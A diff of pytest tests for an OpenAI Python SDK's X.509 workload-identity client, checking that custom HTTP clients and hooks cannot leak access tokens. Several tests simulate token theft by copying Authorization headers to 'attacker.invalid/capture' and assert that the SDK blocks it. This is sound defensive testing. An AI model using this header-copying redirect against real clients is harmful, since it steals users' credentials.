@@ -265,6 +265,64 @@ async def test_async_x509_validates_requests_reconstructed_by_custom_clients(
     assert [str(request.url) for request in requests] == expected
 
 
+@pytest.mark.parametrize("authorization", ["Bearer substituted-token", "Bearer access%2Dtoken"])
+@pytest.mark.parametrize("copy_access_token", [False, True])
+def test_sync_x509_rejects_recursively_reconstructed_protected_requests(
+    authorization: str, copy_access_token: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                copied = httpx2.Request(
+                    request.method, "https://attacker.invalid/capture", headers=dict(request.headers)
+                )
+                copied.headers["host"] = "attacker.invalid"
+                copied.headers["Authorization"] = authorization
+                if copy_access_token:
+                    copied.headers["X-Copied-Credential"] = request.headers["Authorization"]
+                return self.send(copied, **kwargs)
+            return super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.parametrize("authorization", ["Bearer substituted-token", "Bearer access%2Dtoken"])
+@pytest.mark.parametrize("copy_access_token", [False, True])
+async def test_async_x509_rejects_recursively_reconstructed_protected_requests(
+    authorization: str, copy_access_token: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    class ReconstructingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                copied = httpx2.Request(
+                    request.method, "https://attacker.invalid/capture", headers=dict(request.headers)
+                )
+                copied.headers["host"] = "attacker.invalid"
+                copied.headers["Authorization"] = authorization
+                if copy_access_token:
+                    copied.headers["X-Copied-Credential"] = request.headers["Authorization"]
+                return await self.send(copied, **kwargs)
+            return await super().send(request, **kwargs)
+
+    http_client = ReconstructingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
 @pytest.mark.parametrize("redirect", [False, True])
 @pytest.mark.parametrize("delegate_storage", ["attribute", "slot", "private_slot", "list", "dict"])
 @pytest.mark.parametrize("reconstruct", [False, True])
@@ -407,6 +465,32 @@ async def test_async_x509_validates_requests_delegated_to_another_http_client(
 
     expected = [_TOKEN_URL] if redirect else [_TOKEN_URL, _API_URL]
     assert [str(request.url) for request in requests] == expected
+
+
+def test_sync_x509_does_not_traverse_unrelated_custom_client_state() -> None:
+    class UninspectableHistory(dict[str, object]):
+        @override
+        def values(self) -> Any:
+            raise AssertionError("unrelated application-owned request history was traversed")
+
+    http_client = httpx2.Client(transport=httpx2.MockTransport(_response))
+    vars(http_client)["request_history"] = UninspectableHistory({"nested": {"large": [object()]}})
+
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        assert client.models.list().object == "list"
+
+
+async def test_async_x509_does_not_traverse_unrelated_custom_client_state() -> None:
+    class UninspectableHistory(dict[str, object]):
+        @override
+        def values(self) -> Any:
+            raise AssertionError("unrelated application-owned request history was traversed")
+
+    http_client = httpx2.AsyncClient(transport=httpx2.MockTransport(_response))
+    vars(http_client)["request_history"] = UninspectableHistory({"nested": {"large": [object()]}})
+
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        assert (await client.models.list()).object == "list"
 
 
 @pytest.mark.parametrize("redirect", [False, True])
@@ -1084,7 +1168,8 @@ def test_x509_hook_list_composition_never_retains_private_validation_callbacks(m
     assert first_hooks == expected
 
 
-def test_sync_x509_preserves_custom_client_send_and_response_encoding() -> None:
+@pytest.mark.parametrize("instance_send", [False, True])
+def test_sync_x509_preserves_custom_client_send_and_response_encoding(instance_send: bool) -> None:
     class RecordingClient(httpx2.Client):
         def __init__(self) -> None:
             self.sent: list[str] = []
@@ -1119,6 +1204,9 @@ def test_sync_x509_preserves_custom_client_send_and_response_encoding() -> None:
             super().__exit__(*args)
 
     http_client = RecordingClient()
+    original_send = http_client.send
+    if instance_send:
+        vars(http_client)["send"] = original_send
     with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
         response = client.get("/models", cast_to=httpx2.Response)
         assert response.text == "café"
@@ -1126,9 +1214,11 @@ def test_sync_x509_preserves_custom_client_send_and_response_encoding() -> None:
         assert http_client.send_count == 1
         assert http_client.lifecycle == []
         assert http_client._state.name == "OPENED"
+        assert (vars(http_client).get("send") is original_send) is instance_send
 
 
-async def test_async_x509_preserves_custom_client_send_and_response_encoding() -> None:
+@pytest.mark.parametrize("instance_send", [False, True])
+async def test_async_x509_preserves_custom_client_send_and_response_encoding(instance_send: bool) -> None:
     class RecordingClient(httpx2.AsyncClient):
         def __init__(self) -> None:
             self.sent: list[str] = []
@@ -1163,6 +1253,9 @@ async def test_async_x509_preserves_custom_client_send_and_response_encoding() -
             await super().__aexit__(*args)
 
     http_client = RecordingClient()
+    original_send = http_client.send
+    if instance_send:
+        vars(http_client)["send"] = original_send
     async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
         response = await client.get("/models", cast_to=httpx2.Response)
         assert response.text == "café"
@@ -1170,6 +1263,7 @@ async def test_async_x509_preserves_custom_client_send_and_response_encoding() -
         assert http_client.send_count == 1
         assert http_client.lifecycle == []
         assert http_client._state.name == "OPENED"
+        assert (vars(http_client).get("send") is original_send) is instance_send
 
 
 def test_sync_x509_preserves_custom_client_state_across_concurrent_requests() -> None:
@@ -1361,6 +1455,10 @@ async def test_async_x509_preserves_mounted_transports_and_restores_caller_confi
         "api_key",
         "matching_api_key",
         "direct",
+        "direct_prebuilt",
+        "direct_prebuilt_authorized",
+        "direct_prebuilt_propagated",
+        "direct_prebuilt_authorized_propagated",
         "direct_authorized",
         "direct_propagated",
         "direct_authorized_propagated",
@@ -1411,7 +1509,12 @@ def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode
                     )
                     if "authorized" in nested_mode and "hook_authorized" not in nested_mode:
                         headers["Authorization"] = "Bearer telemetry-token"
-                    assert self.get("https://telemetry.example/v1/models", headers=headers).json()["object"] == "list"
+                    if "prebuilt" in nested_mode:
+                        auxiliary = httpx2.Request("GET", "https://telemetry.example/v1/models", headers=headers)
+                        response = self.send(auxiliary)
+                    else:
+                        response = self.get("https://telemetry.example/v1/models", headers=headers)
+                    assert response.json()["object"] == "list"
                 else:
                     assert self.nested is not None
                     assert self.nested.models.list().object == "list"
@@ -1430,7 +1533,11 @@ def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode
         )
 
     with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
-        assert client.models.list().object == "list"
+        if nested_mode == "direct_prebuilt_authorized_propagated":
+            with pytest.raises(OpenAIError, match="configured API origin"):
+                client.models.list()
+        else:
+            assert client.models.list().object == "list"
 
     assert http_client.nested_completed
 
@@ -1442,6 +1549,10 @@ def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode
         "api_key",
         "matching_api_key",
         "direct",
+        "direct_prebuilt",
+        "direct_prebuilt_authorized",
+        "direct_prebuilt_propagated",
+        "direct_prebuilt_authorized_propagated",
         "direct_authorized",
         "direct_propagated",
         "direct_authorized_propagated",
@@ -1492,7 +1603,11 @@ async def test_async_x509_allows_nested_requests_using_the_same_http_client(nest
                     )
                     if "authorized" in nested_mode and "hook_authorized" not in nested_mode:
                         headers["Authorization"] = "Bearer telemetry-token"
-                    response = await self.get("https://telemetry.example/v1/models", headers=headers)
+                    if "prebuilt" in nested_mode:
+                        auxiliary = httpx2.Request("GET", "https://telemetry.example/v1/models", headers=headers)
+                        response = await self.send(auxiliary)
+                    else:
+                        response = await self.get("https://telemetry.example/v1/models", headers=headers)
                     assert response.json()["object"] == "list"
                 else:
                     assert self.nested is not None
@@ -1512,17 +1627,25 @@ async def test_async_x509_allows_nested_requests_using_the_same_http_client(nest
         )
 
     async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
-        assert (await client.models.list()).object == "list"
+        if nested_mode == "direct_prebuilt_authorized_propagated":
+            with pytest.raises(OpenAIError, match="configured API origin"):
+                await client.models.list()
+        else:
+            assert (await client.models.list()).object == "list"
 
     assert http_client.nested_completed
 
 
-def test_sync_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() -> None:
+@pytest.mark.parametrize("prebuilt", [False, True])
+@pytest.mark.parametrize("credential_header", ["Authorization", "X-Copied-Credential"])
+def test_sync_x509_rejects_auxiliary_hooks_that_add_the_active_access_token(
+    prebuilt: bool, credential_header: str
+) -> None:
     requests: list[httpx2.Request] = []
 
     def inject_token(request: httpx2.Request) -> None:
         if request.url.host == "telemetry.example":
-            request.headers["Authorization"] = "Bearer access-token"
+            request.headers[credential_header] = "Bearer access-token"
             request.url = httpx2.URL("https://attacker.invalid/capture")
             request.headers["host"] = "attacker.invalid"
 
@@ -1538,7 +1661,10 @@ def test_sync_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() ->
         def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
             if not self.sent_auxiliary:
                 self.sent_auxiliary = True
-                self.get("https://telemetry.example/v1/models")
+                if prebuilt:
+                    self.send(httpx2.Request("GET", "https://telemetry.example/v1/models"))
+                else:
+                    self.get("https://telemetry.example/v1/models")
             return super().send(request, **kwargs)
 
     http_client = NestedClient()
@@ -1549,12 +1675,16 @@ def test_sync_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() ->
     assert [str(request.url) for request in requests] == [_TOKEN_URL]
 
 
-async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() -> None:
+@pytest.mark.parametrize("prebuilt", [False, True])
+@pytest.mark.parametrize("credential_header", ["Authorization", "X-Copied-Credential"])
+async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_token(
+    prebuilt: bool, credential_header: str
+) -> None:
     requests: list[httpx2.Request] = []
 
     async def inject_token(request: httpx2.Request) -> None:
         if request.url.host == "telemetry.example":
-            request.headers["Authorization"] = "Bearer access-token"
+            request.headers[credential_header] = "Bearer access-token"
             request.url = httpx2.URL("https://attacker.invalid/capture")
             request.headers["host"] = "attacker.invalid"
 
@@ -1570,7 +1700,10 @@ async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_tok
         async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
             if not self.sent_auxiliary:
                 self.sent_auxiliary = True
-                await self.get("https://telemetry.example/v1/models")
+                if prebuilt:
+                    await self.send(httpx2.Request("GET", "https://telemetry.example/v1/models"))
+                else:
+                    await self.get("https://telemetry.example/v1/models")
             return await super().send(request, **kwargs)
 
     http_client = NestedClient()
@@ -1581,7 +1714,54 @@ async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_tok
     assert [str(request.url) for request in requests] == [_TOKEN_URL]
 
 
-def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token() -> None:
+def test_sync_x509_allows_concurrent_origins_with_the_same_access_token() -> None:
+    both_active = threading.Barrier(2)
+
+    class ConcurrentClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            both_active.wait(timeout=5)
+            return super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(_response))
+    clients = [
+        OpenAI(workload_identity=_identity(), http_client=transport, base_url=origin, max_retries=0)
+        for origin in ("https://mtls.api.openai.com/v1", "https://mtls-us.api.openai.com/v1")
+    ]
+
+    with ThreadPoolExecutor(max_workers=2) as executor:
+        results = [executor.submit(client.models.list) for client in clients]
+        assert [result.result(timeout=5).object for result in results] == ["list", "list"]
+
+
+async def test_async_x509_allows_concurrent_origins_with_the_same_access_token() -> None:
+    active_count = 0
+    both_active = asyncio.Event()
+
+    class ConcurrentClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            nonlocal active_count
+            active_count += 1
+            if active_count == 2:
+                both_active.set()
+            await asyncio.wait_for(both_active.wait(), timeout=5)
+            return await super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(_response))
+    clients = [
+        AsyncOpenAI(workload_identity=_identity(), http_client=transport, base_url=origin, max_retries=0)
+        for origin in ("https://mtls.api.openai.com/v1", "https://mtls-us.api.openai.com/v1")
+    ]
+
+    assert [result.object for result in await asyncio.gather(*(client.models.list() for client in clients))] == [
+        "list",
+        "list",
+    ]
+
+
+@pytest.mark.parametrize("cross_origin", [False, True])
+def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token(cross_origin: bool) -> None:
     requests: list[httpx2.Request] = []
     both_active = threading.Barrier(2)
     release_second = threading.Event()
@@ -1602,11 +1782,22 @@ def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token
     class ConcurrentClient(httpx2.Client):
         @override
         def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
-            if request.url.host == "mtls.api.openai.com":
+            if request.url.host in ("mtls.api.openai.com", "mtls-us.api.openai.com"):
                 both_active.wait(timeout=5)
                 if request.headers.get("Authorization") == "Bearer token-one":
                     try:
-                        self.get("https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"})
+                        if cross_origin:
+                            self.get(
+                                "https://mtls-us.api.openai.com/v1/models",
+                                headers={
+                                    "Authorization": "Bearer token-two",
+                                    "X-Copied-Credential": "Bearer token-one",
+                                },
+                            )
+                        else:
+                            self.get(
+                                "https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"}
+                            )
                     finally:
                         release_second.set()
                 else:
@@ -1618,6 +1809,7 @@ def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token
         OpenAI(
             workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
             http_client=transport,
+            base_url="https://mtls-us.api.openai.com/v1" if cross_origin and suffix == "two" else None,
             max_retries=0,
         )
         for suffix in ("one", "two")
@@ -1625,14 +1817,15 @@ def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token
 
     with ThreadPoolExecutor(max_workers=2) as executor:
         results = [executor.submit(client.models.list) for client in clients]
-        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+        with pytest.raises(OpenAIError, match="configured API origin|authorization|single API origin"):
             results[0].result(timeout=5)
         assert results[1].result(timeout=5).object == "list"
 
     assert all(request.url.host != "attacker.invalid" for request in requests)
 
 
-async def test_async_x509_rejects_auxiliary_requests_with_another_active_identity_token() -> None:
+@pytest.mark.parametrize("cross_origin", [False, True])
+async def test_async_x509_rejects_auxiliary_requests_with_another_active_identity_token(cross_origin: bool) -> None:
     requests: list[httpx2.Request] = []
     active_count = 0
     both_active = asyncio.Event()
@@ -1655,16 +1848,25 @@ async def test_async_x509_rejects_auxiliary_requests_with_another_active_identit
         @override
         async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
             nonlocal active_count
-            if request.url.host == "mtls.api.openai.com":
+            if request.url.host in ("mtls.api.openai.com", "mtls-us.api.openai.com"):
                 active_count += 1
                 if active_count == 2:
                     both_active.set()
                 await asyncio.wait_for(both_active.wait(), timeout=5)
                 if request.headers.get("Authorization") == "Bearer token-one":
                     try:
-                        await self.get(
-                            "https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"}
-                        )
+                        if cross_origin:
+                            await self.get(
+                                "https://mtls-us.api.openai.com/v1/models",
+                                headers={
+                                    "Authorization": "Bearer token-two",
+                                    "X-Copied-Credential": "Bearer token-one",
+                                },
+                            )
+                        else:
+                            await self.get(
+                                "https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"}
+                            )
                     finally:
                         release_second.set()
                 else:
@@ -1676,6 +1878,7 @@ async def test_async_x509_rejects_auxiliary_requests_with_another_active_identit
         AsyncOpenAI(
             workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
             http_client=transport,
+            base_url="https://mtls-us.api.openai.com/v1" if cross_origin and suffix == "two" else None,
             max_retries=0,
         )
         for suffix in ("one", "two")
@@ -1683,7 +1886,7 @@ async def test_async_x509_rejects_auxiliary_requests_with_another_active_identit
 
     first, second = await asyncio.gather(*(client.models.list() for client in clients), return_exceptions=True)
     assert isinstance(first, OpenAIError)
-    assert "configured API origin" in str(first) or "authorization" in str(first)
+    assert any(message in str(first) for message in ("configured API origin", "authorization", "single API origin"))
     assert not isinstance(second, BaseException)
     assert second.object == "list"
     assert all(request.url.host != "attacker.invalid" for request in requests)
